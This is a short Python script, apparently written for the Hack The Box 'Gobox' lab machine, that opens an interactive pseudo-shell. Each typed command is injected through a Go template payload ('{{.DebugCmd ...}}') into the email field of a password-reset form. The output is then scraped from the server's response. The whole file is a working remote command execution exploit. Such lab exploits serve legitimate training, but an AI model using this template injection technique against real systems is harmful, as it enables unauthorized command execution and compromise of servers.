#!/usr/bin/env python3
from cmd import Cmd
import requests
import re
from html import unescape


class Term(Cmd):
    prompt = "Gobox =>"
    capture_re = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)

    def default(self, args):
        cmd = args.replace('"', '\\"')
        respose = requests.post('http://10.10.11.113:8080/forgot/',data ={
            "email" : f'{{{{.DebugCmd "{cmd}"}}}}'
        })
        #import pdb; pdb.set_trace()
        try:
            result = (self.capture_re.search(respose.text).group(1))
            result = unescape(unescape(result))
            print(result)
        except:
            import pdb; pdb.set_trace()


    def do_exit(self, args):
        #exit
        return True

term =Term()
term.cmdloop()
